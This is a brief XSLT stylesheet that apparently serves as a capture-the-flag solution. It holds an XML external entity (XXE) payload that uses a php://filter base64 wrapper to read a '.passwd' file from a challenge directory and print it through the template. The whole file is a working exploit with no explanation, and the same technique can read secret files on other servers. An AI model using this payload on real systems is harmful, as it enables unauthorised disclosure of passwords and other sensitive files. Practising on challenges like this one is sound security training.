<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE xsl:stylesheet [
<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/challenge/web-serveur/ch50/.passwd" >
]>
<xsl:template match="/">
&xxe;
</xsl:template>
